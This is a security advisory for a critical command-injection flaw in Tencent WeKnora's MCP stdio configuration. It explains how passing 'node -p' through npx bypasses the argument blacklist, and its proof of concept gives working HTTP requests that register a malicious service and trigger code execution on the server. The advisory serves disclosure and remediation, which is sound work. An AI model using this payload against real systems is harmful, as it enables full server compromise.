# WeKnora has Remote Code Execution (RCE) via Command Injection in MCP Stdio Configuration Validation

**GHSA**: GHSA-r55h-3rwj-hcmg | **CVE**: CVE-2026-30861 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-78

**Affected Packages**:
- **github.com/Tencent/WeKnora** (go): >= 0.2.5, < 0.2.10

## Description

### Summary

A critical unauthenticated remote code execution (RCE) vulnerability exists in the MCP stdio configuration validation introduced in version 2.0.5. 

The application allows unrestricted user registration, meaning any attacker can create an account and exploit the command injection flaw. Despite implementing a whitelist for allowed commands (`npx`, `uvx`) and blacklists for dangerous arguments and environment variables, the validation can be bypassed using the `-p` flag with `npx node`. This allows any attacker to execute arbitrary commands with the application's privileges, leading to complete system compromise. 

The vulnerability remained unfixed across multiple releases (2.0.6-2.0.9) before being silently patched in version 2.0.10, without a published CVE, potentially leaving customers unaware.

### Details

The application's open registration policy, combined with the vulnerable MCP stdio configuration, creates an unrestricted attack surface. Any attacker can:
1. Register a new account without restrictions (no email verification, approval process, or rate limiting mentioned)
2. Obtain API authentication credentials
3. Exploit the command injection vulnerability to execute arbitrary code

The security patch introduced in commit f7900a5e9a18c99d25cec9589ead9e4e59ce04bb attempts to prevent command injection through:
1. **Command Whitelist**: Only `uvx` and `npx` are allowed
2. **Argument Blacklist**: Blocks dangerous patterns including shells, command chaining, and path traversal
3. **Environment Variable Blacklist**: Restricts sensitive variables like `LD_PRELOAD`, `PATH`, etc.

However, the patch has a critical flaw: the `-p` flag in `npx node` is not explicitly blocked in the `DangerousArgPatterns` regex list. The `-p` flag allows Node.js to evaluate and execute arbitrary JavaScript code, effectively bypassing the argument validation.

The vulnerable code flow:
- `ValidateStdioConfig()` calls `ValidateStdioArgs(args)`
- `ValidateStdioArgs()` checks each argument against `DangerousArgPatterns`
- The pattern list does not include `-p` or similar execution flags
- Arguments like `["node", "-p", "require('fs').writeFileSync(...)"]` pass validation
- When executed, `npx node -p <payload>` executes the JavaScript payload

**Timeline of Concern:**
- **Version 2.0.5**: Initial patch introducing validation (incomplete/bypassable)
- **Versions 2.0.6-2.0.9**: Vulnerability persists with no public notification
- **Version 2.0.10** (commit 57d6fea8bc265ad28b385e0158957c870cff4b50): Stdio-based MCP server is disabled entirely.
- **Issue**: The hot fix was deployed silently without a CVE publication or security advisory, meaning customers using versions 2.0.5-2.0.9 remained unaware of the critical vulnerability

This silent fix pattern poses significant risks:
- Customers may not know to update immediately
- Security scanning tools may not flag the vulnerability without a published CVE
- Organisations relying on vendor advisories have no record of the issue
- There is no documented attack history or mitigation guidance for affected versions

### PoC

**Step 1: Register a new account (unauthenticated)**

**Step 2: Create a malicious MCP service**

```http
POST /api/v1/mcp-services HTTP/1.1
Host: localhost:8080
Authorization: Bearer [JWT_TOKEN_FROM_REGISTRATION]
Content-Type: application/json

{
    "name":"rce",
    "description":"rce",
    "enabled":true,
    "transport_type":"stdio",
    "stdio_config":{
        "command":"npx",
        "args":["node","-p","require('fs').writeFileSync('/tmp/pwned.txt', 'Hacked by attacker')"]
    },
    "env_vars":{}
}
```

Response will contain the service ID (e.g., 087854f4-bde3-4468-8702-4aeb95c868da)

**Step 3: Trigger the RCE by testing the service**

```http
POST /api/v1/mcp-services/087854f4-bde3-4468-8702-4aeb95c868da/test HTTP/1.1
Host: localhost:8080
Authorization: Bearer [JWT_TOKEN_FROM_REGISTRATION]
Content-Type: application/json

{}
```

**Step 4: Verify exploitation**

On the server, the file `/tmp/pwned.txt` will be created with content "Hacked by attacker", confirming arbitrary command execution.

### Impact

**Severity**: Critical

Unauthenticated RCE allowing complete server compromise. An attacker can register an account and execute arbitrary commands with full application privileges.

- Full data breach and system compromise
- Install malware, backdoors, ransomware
- Lateral movement to internal systems
- Versions 2.0.5-2.0.9 vulnerable without notification

**Immediate Actions**:
1. Upgrade to 2.0.10+ immediately
2. Review logs for exploitation since 2.0.5
3. Check for suspicious MCP configurations
4. Monitor for unauthorized file creation
5. Assume breach if compromise suspected
---
